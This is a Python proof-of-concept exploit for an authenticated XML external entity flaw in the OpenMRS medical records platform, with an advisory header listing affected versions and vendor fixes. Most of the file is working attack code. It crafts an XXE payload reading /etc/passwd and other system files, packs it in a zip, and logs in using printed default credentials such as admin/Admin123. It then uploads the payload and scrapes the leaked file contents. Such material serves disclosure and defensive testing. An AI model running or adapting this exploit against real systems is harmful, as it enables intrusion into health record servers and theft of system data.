#
# OpenMRS 2.3 (1.11.4) XML External Entity (XXE) Processing PoC Exploit
#
#
# Vendor: OpenMRS Inc.
# Product web page: http://www.openmrs.org
# Affected version: OpenMRS 2.3, 2.2, 2.1, 2.0 (Platform 1.11.4 (Build 6ebcaf), 1.11.2 and 1.10.0)
#                   OpenMRS-TB System (OpenMRS 1.9.7 (Build 60bd9b))
#
# Summary: OpenMRS is an application which enables design of a customized medical
# records system with no programming knowledge (although medical and systems analysis
# knowledge is required). It is a common framework upon which medical informatics
# efforts in developing countries can be built.
#
# Desc: The vulnerability is caused due to an error when parsing XML entities within
# ZIP archives and can be exploited to e.g. disclose data from local resources or cause
# a DoS condition (billion laughs) via a specially crafted XML file including external
# entity references.
#
#
# Tested on: Ubuntu 12.04.5 LTS
#            Apache Tomcat/7.0.26
#            Apache Tomcat/6.0.36
#            Apache Coyote/1.1
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2015-5289
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5289.php
#
# Affected: OpenMRS Core, Serialization.Xstream module, Metadata Sharing module
# Severity: Major
# Exploit: Remote Code Execution by an authenticated user
#
# Vendor Bug Fixes:
#
# Disabled serialization and deserialization of dynamic proxies
# Disabled deserialization of external entities in XML files
#
# https://talk.openmrs.org/t/openmrs-security-advisories-2015-11-30/3868
# https://talk.openmrs.org/t/critical-security-advisory-2015-11-25/3824
# https://wiki.openmrs.org/display/RES/Release+Notes+2.3.1
# http://openmrs.org/2015/12/reference-application-2-3-1-released/
# https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.9.10
# https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.10.3
# https://wiki.openmrs.org/display/RES/Platform+Release+Notes+1.11.5
# https://modules.openmrs.org/modulus/api/releases/1308/download/serialization.xstream-0.2.10.omod
# https://modules.openmrs.org/modulus/api/releases/1309/download/metadatasharing-1.1.10.omod
# https://modules.openmrs.org/modulus/api/releases/1303/download/reporting-0.9.8.1.omod
#
# OpenMRS platform has been upgraded to version 1.11.5
# Reporting module has been upgraded to version 0.9.8.1
# Metadata sharing module has been upgraded to version 1.1.10
# Serialization.xstream module has been upgraded to version 0.2.10
#
# Who is affected?
#
# Anyone running OpenMRS Platform (1.9.0 and later)
# Anyone running OpenMRS Reference Application 2.0, 2.1, 2.2, 2.3
# Anyone that has installed the serialization.xstream module except for the newly released 0.2.10 version.
# Anyone that has installed the metadatasharing module except for the newly released 1.1.10 version.
#
#
# 02.11.2015
#
 
 
import itertools, mimetools, mimetypes
import cookielib, urllib, urllib2, sys
import time, datetime, re, zipfile, os
import binascii
 
from urllib2 import URLError
 
global bindata
 
piton = os.path.basename(sys.argv[0])
 
def bannerche():
    print &#039;&#039;&#039;
 @-------------------------------------------------@
 |                                                 |
 |      OpenMRS 2.3 Authenticated XXE Exploit      |
 |               ID: ZSL-2015-5289                 |
 |       Copyleft (c) 2015, Zero Science Lab       |
 |                                                 |
 @-------------------------------------------------@
          &#039;&#039;&#039;
    if len(sys.argv) < 4:
        print &#039;\n[+] Usage: &#039;+piton+&#039; <host> <port> <path> \n&#039;
        print &#039;[+] Example: &#039;+piton+&#039; uat05.zeroscience.mk 8080 openmrs\n&#039;
        sys.exit()
 
bannerche()
 
print &#039;[+] Date: &#039;+str(datetime.date.today())
 
payload = &#039;&#039;&#039;<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ZSL [
   <!ENTITY xxe1 SYSTEM "file:////etc/passwd" >
   <!ENTITY xxe2 SYSTEM "file:///etc/resolv.conf" >
   <!ENTITY xxe3 SYSTEM "file:///etc/issue" >]>
<package id="1" uuid="eecb64f8-35b0-412b-acda-3d83edf4ee63">
  <dateCreated id="2">2015-11-06 10:47:19</dateCreated>
  <name>&xxe1;</name>
  <description>&xxe2;</description>
  <openmrsVersion>&xxe3;</openmrsVersion>
  <version>1</version>
</package>&#039;&#039;&#039;
 
print &#039;[+] Creating header.xml file.&#039;
file = open(&#039;header.xml&#039;, &#039;w&#039;)
file.write(payload)
file.close()
time.sleep(1)
print &#039;[+] Packing evil XML file.&#039;
 
with zipfile.ZipFile(&#039;xxe.zip&#039;, &#039;w&#039;) as devzip:
    devzip.write(&#039;header.xml&#039;)
     
os.remove(&#039;header.xml&#039;)
print &#039;[+] XML file vacuumed.&#039;
time.sleep(1)
 
filename = &#039;xxe.zip&#039;
with open(filename, &#039;rb&#039;) as f:
    content = f.read()
hexo = binascii.hexlify(content)
bindata = binascii.unhexlify(hexo)
 
print &#039;[+] File xxe.zip successfully created!&#039;
print &#039;[+] Initialising communication.&#039;
 
host = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
 
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
print &#039;[+] Probing target http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+path+&#039;/&#039;
 
try:
    checkhost = opener.open(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+path+&#039;/login.htm&#039;)
    hostresp = checkhost.read()
except urllib2.HTTPError, errorzio:
    if errorzio.code == 404:
        print &#039;[+] Error:&#039;
        print &#039;[+] Check your path entry!&#039;
        print
        sys.exit()
except URLError, errorziocvaj:
    if errorziocvaj.reason:
        print &#039;[+] Error:&#039;
        print &#039;[+] Check your hostname entry!&#039;
        print
        sys.exit()
 
print &#039;[+] Target seems OK.&#039;
print &#039;[+] Login please:&#039;
 
print &#039;&#039;&#039;
Username:  doctor      nurse      clerk      sysadmin      admin      scheduler
Password: Doctor123   Nurse123   Clerk123   Sysadmin123   Admin123   Scheduler123
&#039;&#039;&#039;
 
username = raw_input(&#039;[*] Enter username: &#039;)
password = raw_input(&#039;[*] Enter password: &#039;)
 
login_data = urllib.urlencode({
    &#039;username&#039; : username,
    &#039;password&#039; : password,
    &#039;sessionLocation&#039; : &#039;3&#039;,
    &#039;redirectUrl&#039; : &#039;/&#039;+path+&#039;/module/metadatasharing/import/list.form&#039;
})
 
login = opener.open(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+path+&#039;/login.htm&#039;, login_data)
auth = login.read()
 
for session in cj:
    sessid = session.name
 
print &#039;[+] Mapping session ID.&#039;
ses_chk = re.search(r&#039;%s=\w+&#039; % sessid , str(cj))
cookie = ses_chk.group(0)
print &#039;[+] Cookie: &#039;+cookie
 
if re.search(r&#039;Invalid username/password. Please try again&#039;, auth):
    print &#039;[+] Incorrect username or password.&#039;
    print
    sys.exit()
else:
    print &#039;[+] Authenticated!&#039;
 
 
opener.open(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+path+&#039;/module/metadatasharing/import/list.form&#039;)
print &#039;[+] Sending payload.&#039;
 
class MultiPartForm(object):
 
    def __init__(self):
        self.form_fields = []
        self.files = []
        self.boundary = mimetools.choose_boundary()
        return
     
    def get_content_type(self):
        return &#039;multipart/form-data; boundary=%s&#039; % self.boundary
 
    def add_field(self, name, value):
        self.form_fields.append((name, value))
        return
 
    def add_file(self, fieldname, filename, fileHandle, mimetype=None):
        body = fileHandle.read()
        if mimetype is None:
            mimetype = mimetypes.guess_type(filename)[0] or &#039;application/octet-stream&#039;
        self.files.append((fieldname, filename, mimetype, body))
        return
     
    def __str__(self):
 
        parts = []
        part_boundary = &#039;--&#039; + self.boundary
         
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: form-data; name="%s"&#039; % name,
              &#039;&#039;,
              value,
            ]
            for name, value in self.form_fields
            )
         
        parts.extend(
            [ part_boundary,
              &#039;Content-Disposition: file; name="%s"; filename="%s"&#039; % \
                 (field_name, filename),
              &#039;Content-Type: %s&#039; % content_type,
              &#039;&#039;,
              body,
            ]
            for field_name, filename, content_type, body in self.files
            )
         
        flattened = list(itertools.chain(*parts))
        flattened.append(&#039;--&#039; + self.boundary + &#039;--&#039;)
        flattened.append(&#039;&#039;)
        return &#039;\r\n&#039;.join(flattened)
 
if __name__ == &#039;__main__&#039;:
    form = MultiPartForm()
    form.add_field(&#039;file"; filename="xxe.zip&#039;, bindata)
    form.add_field(&#039;url&#039;, &#039;&#039;)
    request = urllib2.Request(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+path+&#039;/module/metadatasharing/import/upload.form&#039;)
    request.add_header(&#039;User-agent&#039;, &#039;joxypoxy 6.5&#039;)
    body = str(form)
    request.add_header(&#039;Origin&#039;, &#039;http://&#039;+host+&#039;:&#039;+port)
    request.add_header(&#039;Accept-Encoding&#039;, &#039;gzip, deflate&#039;)
    request.add_header(&#039;Accept&#039;, &#039;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#039;)
    request.add_header(&#039;Accept-Language&#039;, &#039;en-US,en;q=0.8&#039;)
    request.add_header(&#039;Cache-Control&#039;, &#039;max-age=0&#039;)
    request.add_header(&#039;Upgrade-Insecure-Requests&#039;, &#039;1&#039;)
    request.add_header(&#039;Referer&#039;, &#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+path+&#039;/module/metadatasharing/import/upload.form&#039;)
    request.add_header(&#039;Content-type&#039;, form.get_content_type())
    request.add_header(&#039;Cookie&#039;, cookie)
    request.add_header(&#039;Content-length&#039;, len(body))
    request.add_data(body)
    request.get_data()
    urllib2.urlopen(request).read()
 
 
time.sleep(1)
print &#039;[+] Retrieving /etc/passwd:&#039;
time.sleep(2)
getinfo = opener.open(&#039;http://&#039;+host+&#039;:&#039;+port+&#039;/&#039;+path+&#039;/module/metadatasharing/import/validate.form&#039;)
readinfo = getinfo.read()
striphtml = re.sub("<.*?>", "", readinfo)
match = re.search(r&#039;root:.*/bin/bash&#039;, striphtml, re.DOTALL)
print &#039;\n--------------------------------------------------------&#039;
print match.group(0)
print &#039;--------------------------------------------------------&#039;
 
sys.exit()

